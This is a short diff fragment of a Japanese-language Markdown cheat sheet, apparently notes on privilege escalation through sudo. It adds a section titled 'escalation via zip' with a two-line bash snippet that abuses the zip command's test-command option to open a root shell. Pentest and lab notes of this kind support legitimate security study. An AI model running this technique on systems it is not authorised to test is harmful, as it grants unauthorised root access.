@@ -165,3 +165,10 @@ cat > $FILE_PATH <<'EOF'
 EOF
 sudo $FILE_PATH
 ```
+
+## zip で昇格
+
+```bash
+TF=$(mktemp -u)
+sudo zip $TF /etc/passwd -T -TT 'sh #'
+```
